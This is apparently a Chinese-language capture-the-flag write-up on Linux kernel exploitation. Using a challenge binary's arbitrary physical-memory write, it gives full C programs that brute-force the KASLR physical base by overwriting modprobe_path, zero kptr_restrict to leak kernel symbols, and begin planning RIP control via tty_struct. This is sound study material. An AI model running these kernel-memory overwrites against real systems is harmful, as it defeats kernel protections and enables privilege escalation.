<p>檢查了一下他開啟的 config 選項<br>當開啟 CONFIG_STATIC_USERMODEHELPER 時<br>modprobe 不會根據 kernel 傳入的 modprobe path 動態調整</p>
<p>這邊可以看到針對這項設定的 code<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/security/Kconfig#L205">https://elixir.bootlin.com/linux/v6.13.7/source/security/Kconfig#L205</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">config STATIC_USERMODEHELPER</span><br><span class="line">	<span class="type">bool</span> <span class="string">&quot;Force all usermode helper calls through a single binary&quot;</span></span><br><span class="line">	help</span><br><span class="line">	  By <span class="keyword">default</span>, the kernel can call many different userspace</span><br><span class="line">	  binary programs through the <span class="string">&quot;usermode helper&quot;</span> kernel</span><br><span class="line">	  interface.  Some of these binaries are statically defined</span><br><span class="line">	  either in the kernel code itself, or as a kernel configuration</span><br><span class="line">	  option.  However, some of these are dynamically created at</span><br><span class="line">	  runtime, or can be modified after the kernel has started up.</span><br><span class="line">	  To provide an additional layer of security, route all of these</span><br><span class="line">	  calls through a single executable that can not have its name</span><br><span class="line">	  changed.</span><br><span class="line"></span><br><span class="line">	  Note, it is up to this single binary to then call the relevant</span><br><span class="line">	  <span class="string">&quot;real&quot;</span> usermode helper binary, based on the first argument</span><br><span class="line">	  passed to it.  If desired, this program can filter and pick</span><br><span class="line">	  and choose what real programs are called.</span><br><span class="line"></span><br><span class="line">	  If you wish <span class="keyword">for</span> all usermode helper programs are to be</span><br><span class="line">	  disabled, choose this option and then <span class="built_in">set</span></span><br><span class="line">	  STATIC_USERMODEHELPER_PATH to an empty <span class="built_in">string</span>.</span><br></pre></td></tr></table></figure>

<p>來追一下 code<br>最後他會呼叫 <code>call_modprobe</code></p>
<p>原本他會傳入 modprobe_path 來去執行他<br>但更深入點去看 <code>call_usermodehelper_setup</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">				 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>如果  CONFIG_STATIC_USERMODEHELPER 是開啟的，就會將 path 都設為 <code>CONFIG_STATIC_USERMODEHELPER_PATH</code><br>沒有才會是傳入的 path<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/kernel/umh.c#L355">https://elixir.bootlin.com/linux/v6.13.7/source/kernel/umh.c#L355</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_STATIC_USERMODEHELPER</span></span><br><span class="line">	sub_info-&gt;path = CONFIG_STATIC_USERMODEHELPER_PATH;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	sub_info-&gt;path = path;</span><br></pre></td></tr></table></figure>

<h2 id="broken-KASLR"><a href="#broken-KASLR" class="headerlink" title="broken KASLR"></a>broken KASLR</h2><p>首先因為有開啟 KASLR 的關係<br>所以想 leak 兩個東西<br>Kernel physical base，也就是 kernel image 被載入的 physical address 實際 base address<br>及 Virtual base，也就是被映射的 base address，這樣子找 gadget 很方便</p>
<h3 id="physical-base-address"><a href="#physical-base-address" class="headerlink" title="physical base address"></a>physical base address</h3><p>首先就算開啟了 CONFIG_STATIC_USERMODEHELPER 我們一樣可以寫掉 modprobe_path，也就是說通過嘗試寫掉 modprobe_path<br>之後去檢查 <code>/proc/sys/kernel/modprobe</code> 值是否維持 <code>/usr/sbin/modprobe</code><br>如果被寫掉就代表我們知道了 modprobe_path physicall address<br>之後去扣 offset 就可以得到 physical base address 了</p>
<p>不過到這裡為止，對我來說 physical address 是個黑箱<br>這邊展開了解</p>
<p>首先可以先看 config</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-virtual-machine:~/Desktop/pwn/devmem$ <span class="built_in">cat</span> kernel.config | grep CONFIG_PHYSICAL</span><br><span class="line">CONFIG_PHYSICAL_START=0x1000000</span><br><span class="line">CONFIG_PHYSICAL_ALIGN=0x200000</span><br></pre></td></tr></table></figure>

<p>config 中指定了 kernel physical start 位置在 <code>0x100 0000</code><br>並且他會對齊 <code>0x20 0000</code></p>
<p>先放一下我在 virtual memory manage 文章的圖<br><img src="https://hackmd.io/_uploads/SJSKrYJAkg.png" alt="image"></p>
<p>這兩個是甚麼意思可以來追 source code<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/arch/x86/include/asm/page_types.h">https://elixir.bootlin.com/linux/v6.14-rc4/source/arch/x86/include/asm/page_types.h</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __START_KERNEL_map	_AC(0xffffffff80000000, UL)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD_PHYSICAL_ADDR ((CONFIG_PHYSICAL_START \</span></span><br><span class="line"><span class="meta">				+ (CONFIG_PHYSICAL_ALIGN - 1)) \</span></span><br><span class="line"><span class="meta">				&amp; ~(CONFIG_PHYSICAL_ALIGN - 1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __START_KERNEL		(__START_KERNEL_map + LOAD_PHYSICAL_ADDR)</span></span><br></pre></td></tr></table></figure>

<h3 id="Kernel-physical-and-Virtual-base-relation"><a href="#Kernel-physical-and-Virtual-base-relation" class="headerlink" title="Kernel physical and Virtual base relation"></a>Kernel physical and Virtual base relation</h3><p>kernel code 段開始的位置在 0xffffffff80000000<br>kernel start 經過我們下方寫的腳本可以計算出實際落在 0xffffffff81000000，原因是因為要加上 physical address start </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONFIG_PHYSICAL_START 0x1000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONFIG_PHYSICAL_ALIGN 0x200000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __START_KERNEL_map 0xffffffff80000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD_PHYSICAL_ADDR ((CONFIG_PHYSICAL_START \</span></span><br><span class="line"><span class="meta">				+ (CONFIG_PHYSICAL_ALIGN - 1)) \</span></span><br><span class="line"><span class="meta">				&amp; ~(CONFIG_PHYSICAL_ALIGN - 1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> START_KERNEL		(__START_KERNEL_map + LOAD_PHYSICAL_ADDR)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> kernel = START_KERNEL;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx&quot;</span>, kernel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>這個位置 0xffffffff81000000 是 kernel virtual memory base (nokaslr)<br>0x1000000 是 kernel physical memory base</p>
<p>我們現在已經揭開了黑箱的 address 映射關係了<br>接下來來嘗試爆破 physical address base</p>
<p>但 … 當我 exploit 到這裡時，踩了一個坑<br>我在自己 VM 上測試時怎麼樣都測不出來 KASLR 對於 physical address base 的影響<br>我在開 KASLR 時直接對 <code>0x2dc6c20</code> 寫入時<br>發現有改寫到 modprobe_path<br>也就代表實際上 KASLR 對於 physical address 沒有任何影響<br>但實則不然<br>原因是我上述的啟動腳本指定的 memory 空間太小了，導致 KASLR 沒有隨機化成功 physical address<br>應該改成</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./initramfs.cpio \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor none \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 oops=panic panic_on_warn=1 panic=-1 pti=on&quot;</span> \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -m 1G</span><br></pre></td></tr></table></figure>

<h3 id="KASLR-physical-address"><a href="#KASLR-physical-address" class="headerlink" title="KASLR physical address"></a>KASLR physical address</h3><p>接下來想透過觀察得方式來觀察 physical address base 變化<br>第一次測試</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00100000-3ffdffff : System RAM</span><br><span class="line">  0aa00000-0bab719a : Kernel code</span><br><span class="line">  0bc00000-0c473fff : Kernel rodata</span><br><span class="line">  0c600000-0c9f4a3f : Kernel data</span><br><span class="line">  0d38a000-0d7fffff : Kernel bss</span><br></pre></td></tr></table></figure>
<p>第二次測試</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00100000-3ffdffff : System RAM</span><br><span class="line">  13a00000-14ab719a : Kernel code</span><br><span class="line">  14c00000-15473fff : Kernel rodata</span><br><span class="line">  15600000-159f4a3f : Kernel data</span><br><span class="line">  1638a000-167fffff : Kernel bss</span><br></pre></td></tr></table></figure>

<p>第三次測試</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00100000-3ffdffff : System RAM</span><br><span class="line">  1a800000-1b8b719a : Kernel code</span><br><span class="line">  1ba00000-1c273fff : Kernel rodata</span><br><span class="line">  1c400000-1c7f4a3f : Kernel data</span><br><span class="line">  1d18a000-1d5fffff : Kernel bss</span><br></pre></td></tr></table></figure>

<p>我們可以觀察到一件是<br>KASLR 去隨機化 physical address 時 xxx00000 (x 的部分是會被隨機化的)<br>0x2dc6c20 的 0xc6c20 是不會被影響的，需要去爆破上半部分 xxx 的部分<br>開寫腳本，這邊有個小細節，爆破應該從高位開始爆破，因為低位已經存在許多 kernel code 或是已經被使用的部分，去複寫那些地方都會導致 kernel panic</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> modprobe_start = <span class="number">0x320c6c20</span>;</span><br><span class="line"><span class="type">u_int64_t</span> tmpa = <span class="number">0x612f706d742f</span>;</span><br><span class="line"><span class="type">u_int64_t</span> kernel_physical_base;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_phy</span><span class="params">(<span class="type">u_int64_t</span> address, <span class="type">u_int64_t</span> value)</span>&#123;</span><br><span class="line">    <span class="type">char</span> command[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(command, <span class="string">&quot;/usr/sbin/chall 0x%lx 0x%lx&quot;</span>, address, value);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Try to write&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(command);</span><br><span class="line">    system(command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_modprobepath</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(buf, <span class="number">0x50</span>, <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buf, <span class="string">&quot;/usr/sbin/modprobe\n&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed ...&quot;</span>);</span><br><span class="line">        close(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[!] Find kernel physical base&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        write_phy(modprobe_start, tmpa);</span><br><span class="line">        <span class="keyword">if</span> (check_modprobepath() == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Kernel physical modprobe : 0x%lx&quot;</span>, modprobe_start);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        modprobe_start -= <span class="number">0x100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_physical_base = modprobe_start - <span class="number">0x1dc6c20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel physical base : 0x%lx&quot;</span>, kernel_physical_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>到目前為止已經成功 leak kernel physical base 了</p>
<h3 id="virtual-address-base"><a href="#virtual-address-base" class="headerlink" title="virtual address base"></a>virtual address base</h3><p>接下來要嘗試 leak virtual address base<br>先來了解甚麼是 kptr_restrict<br>可以去嘗試印出 <code>/proc/sys/kernel/kptr_restrict</code><br>上的值，通常都是一個數字<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/gatieme/article/details/78311841">https://blog.csdn.net/gatieme/article/details/78311841</a></p>
<ul>
<li><strong>2</strong>: 內核將符號 (%Kp) 地址打印為全0，root 和普通用戶都沒有權限讀取。</li>
<li><strong>1</strong>: root 用戶有權限讀取，普通用戶無權限讀取。</li>
<li><strong>0</strong>: root 和普通用戶都可以讀取。</li>
</ul>
<p>我們在一般使用者時，沒有權力去讀取 <code>/proc/kallsyms</code><br>但我們現在有 kernel physical address 任意寫<br>直接去把 <code>kptr_restrict</code> 寫掉就可以了</p>
<p>抓 offset 可以這樣做<br><code>cat /proc/kallsyms | grep kptr_restrict</code></p>
<p>這樣就可以把 kptr_restrict 寫掉了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">u_int64_t</span> kptr_restrict_offset = <span class="number">0x1ff49e0</span>;</span><br><span class="line">write_phy(kernel_physical_base + kptr_restrict_offset, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>到目前為止 leak 已經結束，接下來要想提權方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> modprobe_start = <span class="number">0x300c6c20</span>;</span><br><span class="line"><span class="type">u_int64_t</span> tmpa = <span class="number">0x612f706d742f</span>;</span><br><span class="line"><span class="type">u_int64_t</span> kernel_physical_base;</span><br><span class="line"><span class="type">u_int64_t</span> kernel_virtual_base;</span><br><span class="line"><span class="type">u_int64_t</span> kptr_restrict_offset = <span class="number">0x1ff49e0</span>;</span><br><span class="line"><span class="type">u_int64_t</span> modprobe_path_offset = <span class="number">0x1dc6c20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_phy</span><span class="params">(<span class="type">u_int64_t</span> address, <span class="type">u_int64_t</span> value)</span>&#123;</span><br><span class="line">    <span class="type">char</span> command[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(command, <span class="string">&quot;/usr/sbin/chall 0x%lx 0x%lx&quot;</span>, address, value);</span><br><span class="line">    <span class="comment">// puts(&quot;[!] Try to write&quot;);</span></span><br><span class="line">    <span class="comment">// puts(command);</span></span><br><span class="line">    system(command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_modprobepath</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(buf, <span class="number">0x50</span>, <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buf, <span class="string">&quot;/usr/sbin/modprobe\n&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        close(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[!] Find kernel physical base\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_kptr_restrict</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;cat /proc/sys/kernel/kptr_restrict&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cat_kallsyms</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">u_int64_t</span> kernel_virtual_base = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    fp = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening /proc/kallsyms&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;modprobe_path&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx&quot;</span>, &amp;kernel_virtual_base);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_virtual_base = kernel_virtual_base - modprobe_path_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kernel_virtual_base != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Kernel Virtual base : 0x%lx\n&quot;</span>, kernel_virtual_base);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path not found\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        write_phy(modprobe_start, tmpa);</span><br><span class="line">        <span class="keyword">if</span> (check_modprobepath() == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Kernel physical modprobe : 0x%lx\n&quot;</span>, modprobe_start);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        modprobe_start -= <span class="number">0x100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_physical_base = modprobe_start - <span class="number">0x1dc6c20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel physical base : 0x%lx\n&quot;</span>, kernel_physical_base);</span><br><span class="line"></span><br><span class="line">    write_phy(kernel_physical_base + kptr_restrict_offset, <span class="number">0</span>);</span><br><span class="line">    check_kptr_restrict();</span><br><span class="line">    cat_kallsyms();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PS: 如果想 check 你 leak 的 text virtual base address 對不對可以 attach 上去確認<br><img src="https://hackmd.io/_uploads/SkQrUh1Ayg.png" alt="image"></p>
<p>這個有可執行權限，大概率是 text 段的 base<br>所以成功<br><img src="https://hackmd.io/_uploads/H1l8Uny0yl.png" alt="image"></p>
<h2 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h2><p>為何要 control rip 先埋個梗</p>
<p>不能用 modprobe 提權那就想到，可以去 overwrite 自己這支 process 的 cred 來提權<br>不過在講提權之前想先來看 <code>tty_struct</code>、<code>/dev/ptmx</code> </p>
<h3 id="What-is-TTY-device"><a href="#What-is-TTY-device" class="headerlink" title="What is TTY device"></a>What is TTY device</h3><p>TTY（全名：Teletypewriter）原本是指早期的打字機式終端，但在現代 Linux&#x2F;UNIX 系統中，TTY 已泛指各種終端設備（Terminal Devices）</p>
<h3 id="pty-虛擬終端"><a href="#pty-虛擬終端" class="headerlink" title="pty (虛擬終端)"></a>pty (虛擬終端)</h3><p>遠程 telnet 到主機或使用 ssh 時也需要一個終端交互，這就是虛擬終端pty(pseudo-tty)</p>
